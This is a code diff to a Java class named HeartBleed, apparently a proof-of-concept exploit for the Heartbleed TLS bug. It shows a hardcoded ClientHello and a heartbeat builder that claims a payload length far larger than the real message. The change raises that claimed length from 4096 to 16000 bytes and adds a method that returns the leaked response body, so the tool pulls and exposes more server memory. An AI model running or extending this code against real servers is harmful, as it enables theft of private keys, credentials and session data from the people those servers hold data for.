@@ -54,7 +54,7 @@ public class HeartBleed {
 	public void heartBeat(String message) throws IOException{
 		
 		System.out.println("Sending Heartbeat...");
-		outStr.write(makeHeartBeat(message,4096));
+		outStr.write(makeHeartBeat(message,16000));
 		outStr.flush();
 		
 		
@@ -85,6 +85,10 @@ public class HeartBleed {
 		out.close();
 	} 
 	
+	public byte[] getBytes(){
+		return finalMessage.body;
+	}
+	
 	//hex dump of an SSL/TLS hello message
 	static byte[] clientHello = {
 			0x16,0x03,0x02,0x00,(byte) 0xdc,0x01,0x00,0x00,(byte) 0xd8,0x03,0x02
@@ -112,7 +116,7 @@ public class HeartBleed {
 	
 	//constructs a heartbeat with custom message
 	private static byte[] makeHeartBeat(String message, int claimedLen){
-		// 8 = sum of tls record lengths
+		
 		int realLen = message.length();
 		
 		byte[] messageBytes = null;
@@ -124,6 +128,7 @@ public class HeartBleed {
 			e.printStackTrace();
 		}
 		
+		// 8 = sum of tls record lengths
 		ByteBuffer bb = ByteBuffer.allocate(8 + realLen);
 		
 		bb.put((byte)24);
